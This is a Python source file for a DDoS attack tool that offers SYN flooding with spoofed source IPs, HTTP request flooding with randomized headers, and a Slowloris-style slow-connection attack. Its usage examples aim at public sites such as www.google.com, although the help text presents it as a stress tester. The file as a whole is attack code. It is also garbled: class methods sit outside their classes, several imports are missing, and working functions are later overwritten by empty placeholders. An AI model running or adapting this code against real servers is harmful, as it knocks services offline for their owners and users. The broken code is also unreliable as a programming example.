# Banner function
def show_banner():
    banner = r"""
version = '1.0'

	 ██▓███ ▓██   ██▓▓█████▄ ▓█████▄  ▒█████    ██████ 
	▓██░  ██▒▒██  ██▒▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
	▓██░ ██▓▒ ▒██ ██░░██   █▌░██   █▌▒██░  ██▒░ ▓██▄   
	▒██▄█▓▒ ▒ ░ ▐██▓░░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒
	▒██▒ ░  ░ ░ ██▒▓░░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒
	▒▓▒░ ░  ░  ██▒▒▒  ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
	░▒ ░     ▓██ ░▒░  ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
	░░       ▒ ▒ ░░   ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
	         ░ ░        ░       ░        ░ ░        ░  
	         ░ ░      ░       ░                        

	DDos python script | Script used for testing ddos | Ddos attack
	Author: DirtyHeroes
	Github: https://github.com/palacita135/PyDDoS-supreme

	root@kali: python3 pyddos.py --help <for option>

"""
    print(banner)

# Ensure this runs before parsing arguments
show_banner()

import urllib.parse
import http.client
import random
import argparse
import signal
import string
import time
import json
import sys
import os
import re
import shutil
from argparse import ArgumentParser, RawTextHelpFormatter
from socket import socket, AF_INET, SOCK_RAW, IPPROTO_TCP, IPPROTO_IP, IP_HDRINCL, gethostbyname
from threading import Thread, Lock
from struct import pack
from random import randrange

# Check if pip is installed and upgrade it if needed
if not shutil.which("pip"):
    os.system("python3 -m ensurepip && python3 -m pip install --upgrade pip")

# Try to import necessary modules
try:
    import requests
    import colorama
    from termcolor import colored, cprint
except ImportError:
    print("[!] Missing dependencies. Installing now...")

    try:
        os.system('pip install --upgrade colorama termcolor requests')

        print("[+] Installed necessary modules. Restart the script.")
        sys.exit(0)

    except Exception as e:
        print(f"[-] Installation failed: {e}")
        sys.exit(1)

# Initialize colorama for color support
colorama.init()



def fake_ip():
    		while True:
        		ips = [str(randrange(0, 256)) for _ in range(4)]
        		if ips[0] == "127":  # Prevents generating a loopback address
            			continue  # Go back and generate a new IP
        		return '.'.join(ips)  # Return valid I

def check_tgt(args):
    		tgt = args.d
    		try:
        		ip = gethostbyname(tgt)
    		except:
        		sys.exit(cprint("[-] Can't resolve host: Unknown host!", "red"))
    		return ip

def add_useragent():
			try:
				with open("./ua.txt", "r") as fp:
					uagents = re.findall(r"(.+)\n", fp.read())
			except FileNotFoundError:
				cprint("[-] No file named 'ua.txt', failed to load User-Agents", "yellow")
				return []  # ✅ Fix: return [] only on failure
			return uagents  # ✅ Fix: now reachable

def add_bots():
			bots = [  # ✅ Fix: Properly initializing the list inside the function
				"http://www.bing.com/search?q=%40&count=50&first=0",
				"http://www.google.com/search?hl=en&num=100&q=intext%3A%40&ie=utf-8"]
			return bots  # ✅ Fix: return statement inside function

class Pyslow:
    def __init__(self, tgt, port, to, threads, sleep):
        self.tgt = tgt
        self.port = port
        self.to = to
        self.threads = threads
        self.sleep = sleep
        self.method = ['GET', 'POST']
        self.pkt_count = 0

def mypkt(self):
		text = choice(self.method) + ' /' + str(randint(1, 999999999)) + ' HTTP/1.1\r\n' +\
				'Host:' + self.tgt + '\r\n' +\
				'User-Agent:' + choice(add_useragent()) + '\r\n' +\
				'Content-Length: 42\r\n'
		pkt = buffer(text)
		return pkt

def building_socket(self):
		try:
			sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
			sock.settimeout(self.to)
			sock.connect((self.tgt, int(self.port)))
			self.pkt_count += 3
			if sock:
				sock.sendto(self.mypkt(), (self.tgt, int(self.port)))
				self.pkt_count += 1
		except Exception:
			sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
			sock.settimeout(self.to)
			sock.connect((self.tgt, int(self.port)))
			sock.settimeout(None)
			self.pkt_count += 3
			if sock:
				sock.sendto(self.mypkt(), (self.tgt, int(self.port)))
				self.pkt_count += 1
		except KeyboardInterrupt:
			sys.exit(cprint('[-] Canceled by user', 'red'))
		return sock

def sending_packets(self):
		try:
			sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
			sock.settimeout(self.to)
			sock.connect((self.tgt, int(self.port)))
			self.pkt_count += 3
			if sock:
				sock.sendall('X-a: b\r\n')
				self.pkt += 1
		except Exception:
			sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
			sock.settimeout(self.to)
			sock.connect((self.tgt, int(self.port)))
			sock.settimeout(None)
			if sock:
				sock.sendall('X-a: b\r\n')
				self.pkt_count += 1
		except KeyboardInterrupt:
			sys.exit(cprint('[-] Canceled by user', 'red'))
		return sock

def doconnection(self):
		socks = 0
		fail = 0
		lsocks = []
		lhandlers = []
		cprint('\t\tBuilding sockets', 'blue')
		while socks < (int(self.threads)):
			try:
				sock = self.building_socket()
				if sock:
					lsocks.append(sock)
					socks += 1
					if socks > int(self.threads):
						break
			except Exception:
				fail += 1
			except KeyboardInterrupt:
				sys.exit(cprint('[-] Canceled by user', 'red'))
		cprint('\t\tSending packets', 'blue')
		while socks < int(self.threads):
			try:
				handler = self.sending_packets()
				if handler:
					lhandlers.append(handler)
					socks += 1
					if socks > int(self.threads):
						break
				else:
					pass
			except Exception:
				fail += 1
			except KeyboardInterrupt:
				break
				sys.exit(cprint('[-] Canceled by user', 'red'))
		# print colored('I have sent ','green') +
		# colored(str(self.pkt_count),'cyan') + colored(' packets successfully.Now
		# i\'m going to sleep for ','green') + colored(self.sleep,'red') +
		# colored(' second','green')
		time.sleep(self.sleep)

class Requester(Thread):
    def __init__(self, tgt):
        super().__init__()  # Initialize the parent Thread class
        self.tgt = tgt
        self.port = None
        self.ssl = False
        self.req = []
        self.lock = Lock()

        # Parse the URL
        url_type = urllib.parse.urlparse(self.tgt)
        
        # Check if HTTPS or HTTP
        if url_type.scheme == 'https':
            self.ssl = True
            self.port = 443
        else:
            self.port = 80

def header(self):
		cachetype = ['no-cache', 'no-store', 'max-age=' +
	str(randint(0, 10)), 'max-stale=' +
	str(randint(0, 100)), 'min-fresh=' +
		str(randint(0, 10)), 'notransform', 'only-if-cache']
		acceptEc = [
	'compress,gzip',
	'',
	'*',
	'compress;q=0,5, gzip;q=1.0',
		'gzip;q=1.0, indentity; q=0.5, *;q=0']
		acceptC = [
	'ISO-8859-1',
	'utf-8',
	'Windows-1251',
	'ISO-8859-2',
		'ISO-8859-15']
		bot = add_bots()
		c = choice(cachetype)
		a = choice(acceptEc)
		http_header = {
			'User-Agent': choice(add_useragent()),
			'Cache-Control': c,
			'Accept-Encoding': a,
			'Keep-Alive': '42',
			'Host': self.tgt,
			'Referer': choice(bot)
		}
		return http_header

def rand_str(self):
		mystr = []
		for x in range(3):
			chars = tuple(string.ascii_letters + string.digits)
			text = (choice(chars) for _ in range(randint(7, 14)))
			text = ''.join(text)
			mystr.append(text)
		return '&'.join(mystr)

def create_url(self):
		return self.tgt + '?' + self.rand_str()

def data(self):
		url = self.create_url()
		http_header = self.header()
		return (url, http_header)

def run(self):
		try:
			if self.ssl:
				conn = http.client.HTTPSConnection(self.tgt, self.port)
			else:
				conn = http.client.HTTPConnection(self.tgt, self.port)
				self.req.append(conn)
			for reqter in self.req:
				(url, http_header) = self.data()
				method = choice(['get', 'post'])
				reqter.request(method.upper(), url, None, http_header)
		except KeyboardInterrupt:
			sys.exit(cprint('[-] Canceled by user', 'red'))
		except Exception as e:
			print(e)
		finally:
			self.closeConnections()

def closeConnections(self):
		for conn in self.req:
			try:
				conn.close()
			except:
				pass

class Synflood(Thread):
    def __init__(self, tgt, ip, sock=None):
        super().__init__()  # Proper way to initialize the parent Thread class

        self.tgt = tgt
        self.ip = ip
        self.psh = ''
        
        if sock is None:
            self.sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)
            self.sock.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
        else:
            self.sock = sock

        self.lock = Lock()


def checksum(self):
		s = 0
		for i in range(0, len(self.psh), 2):
			w = (ord(self.psh[i]) << 8) + (ord(self.psh[i + 1]))
			s = s + w

		s = (s >> 16) + (s & 0xffff)
		s = ~s & 0xffff

		return s

def Building_packet(self):
		ihl = 5
		version = 4
		tos = 0
		tot = 40
		id = 54321
		frag_off = 0
		ttl = 64
		protocol = IPPROTO_TCP
		check = 10
		s_addr = inet_aton(self.ip)
		d_addr = inet_aton(self.tgt)

		ihl_version = (version << 4) + ihl
		ip_header = pack(
	'!BBHHHBBH4s4s',
	ihl_version,
	tos,
	tot,
	id,
	frag_off,
	ttl,
	protocol,
	check,
	s_addr,
		d_addr)

		source = 54321
		dest = 80
		seq = 0
		ack_seq = 0
		doff = 5
		fin = 0
		syn = 1
		rst = 0
		ack = 0
		psh = 0
		urg = 0
		window = htons(5840)
		check = 0
		urg_prt = 0

		offset_res = (doff << 4)
		tcp_flags = fin + (syn << 1) + (rst << 2) + \
							(psh << 3) + (ack << 4) + (urg << 5)
		tcp_header = pack(
	'!HHLLBBHHH',
	source,
	dest,
	seq,
	ack_seq,
	offset_res,
	tcp_flags,
	window,
	check,
		urg_prt)

		src_addr = inet_aton(self.ip)
		dst_addr = inet_aton(self.tgt)
		place = 0
		protocol = IPPROTO_TCP
		tcp_length = len(tcp_header)

		self.psh = pack('!4s4sBBH', src_addr, dst_addr, place, protocol, tcp_length)
		self.psh = self.psh + tcp_header

		tcp_checksum = self.checksum()

		tcp_header = pack(
	'!HHLLBBHHH',
	source,
	dest,
	seq,
	ack_seq,
	offset_res,
	tcp_flags,
	window,
	tcp_checksum,
		urg_prt)
		packet = ip_header + tcp_header

		return packet

def run(self):
		packet = self.Building_packet()
		try:
			self.sock.sendto(packet, (self.tgt, 0))  # No need to lock here
		except KeyboardInterrupt:
			cprint('[-] Canceled by user', 'red')
			return  # Avoid sys.exit() in threads
		except Exception as e:
			cprint(f"[ERROR] {e}", 'red')

def main():
    parser = ArgumentParser(
        usage="python3 pyddos.py -d <target> [-p <port>] [-T <threads>] [attack type]",
        formatter_class=lambda prog: RawTextHelpFormatter(prog, max_help_position=40),
        prog="pyddos",
        description="Pyddos - A Python-based DDoS testing tool for stress-testing your own servers.",
        epilog=("""
		Examples:
  		python3 pyddos.py -d www.example.com -p 80 -T 2000 -Pyslow
  		python3 pyddos.py -d www.domain.com -s 100 -Request
  		python3 pyddos.py -d www.google.com -Synflood -T 5000 -t 10.0
""")
)

# Define parser
parser = argparse.ArgumentParser(description="Pyddos - DDoS Attack Simulation Tool")
options = parser.add_argument_group('options', '')

# Add Arguments
options.add_argument('-d', metavar='<ip|domain>', required=True, help='Specify your target IP or domain')
options.add_argument('-t', metavar='<float>', default=5.0, help='Set timeout for socket')
options.add_argument('-T', metavar='<int>', default=1000, help='Set number of threads (default = 1000)')
options.add_argument('-p', metavar='<int>', default=80, help='Specify target port (only for Pyslow attack)')
options.add_argument('-s', metavar='<int>', default=100, help='Set sleep time for reconnection')
options.add_argument('-i', metavar='<ip address>', help='Specify a spoofed IP')
options.add_argument('-Request', action='store_true', help='Enable request attack')
options.add_argument('-Synflood', action='store_true', help='Enable SYN flood attack')
options.add_argument('-Pyslow', action='store_true', help='Enable Pyslow attack')
options.add_argument('--fakeip', action='store_true', help='Create a fake IP if spoofed IP is not specified')

# Parse arguments
args = parser.parse_args()


# Placeholder function definitions
def add_bots():
    pass  # Functionality for adding bots

def add_useragent():
    pass  # Functionality for adding User-Agent strings

add_bots()
add_useragent()

def check_tgt(args):
    """Returns the target IP or domain."""
    return args.d  # Just returning the target for now

def fake_ip():
    """Generate a random spoofed IP address."""
    return ".".join(str(random.randint(1, 255)) for _ in range(4))

# SYN Flood Attack
if args.Synflood:
    uid = os.geteuid()
    if uid != 0:
        sys.exit(cprint('[-] You do not have root permissions!', 'red'))

    tgt = check_tgt(args)
    synsock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)
    synsock.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)

    threads = []
    print(colored('[*] Starting SYN Flood on: ', 'blue') + colored(tgt, 'red'))

    while True:
        ip = fake_ip() if not args.i else args.i

        try:
            for x in range(int(args.T)):
                thread = Synflood(tgt, ip, sock=synsock)
                thread.daemon = True
                thread.start()
                threads.append(thread)

            for thread in threads:
                thread.join()
        except KeyboardInterrupt:
            sys.exit(cprint('[-] Canceled by user', 'red'))

# Request Attack
elif args.Request:
    tgt = args.d
    threads = []
    print(colored('[*] Sending requests to: ', 'blue') + colored(tgt, 'red'))

    while True:
        try:
            for x in range(int(args.T)):
                t = Requester(tgt)
                t.daemon = True
                t.start()
                t.join()
        except KeyboardInterrupt:
            sys.exit(cprint('[-] Canceled by user', 'red'))

# Pyslow Attack
elif args.Pyslow:
    try:
        tgt = args.d
        port = args.p
        to = float(args.t)
        st = int(args.s)
        threads = int(args.T)
    except Exception as e:
        print('[-]', e)

    while True:
        try:
            worker = Pyslow(tgt, port, to, threads, st)
            worker.doconnection()
        except KeyboardInterrupt:
            sys.exit(cprint('[-] Canceled by user', 'red'))

# If No Attack Type is Selected
if not (args.Synflood or args.Request or args.Pyslow):
    parser.print_help()
    sys.exit(cprint('[-] You must choose an attack type', 'red'))

# Main Execution
if __name__ == '__main__':
    print(colored("[*] PyDDOS Attack Script Started", "blue"))

if __name__ == '__main__':
		main()
